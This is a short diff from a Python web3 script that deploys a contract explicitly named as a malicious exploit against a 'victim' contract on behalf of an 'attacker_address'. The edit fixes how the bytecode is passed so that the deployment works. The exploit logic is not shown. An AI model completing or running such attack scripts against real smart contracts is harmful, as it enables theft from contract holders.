@@ -50,7 +50,7 @@ compiled_sol = compile_source(malicious_source)
 contract_id, contract_interface = compiled_sol.popitem()
 
 # Deploy malicious contract
-Exploit = w3.eth.contract(abi=contract_interface['abi'], bytecode=contract_interface['bin'])
+Exploit = w3.eth.contract(abi=contract_interface["abi"], bytecode=bytes.fromhex(contract_interface["bin"]))
 construct_txn = Exploit.constructor(token, victim, attacker_address).build_transaction({
     'from': attacker_address,
     'nonce': w3.eth.get_transaction_count(attacker_address),
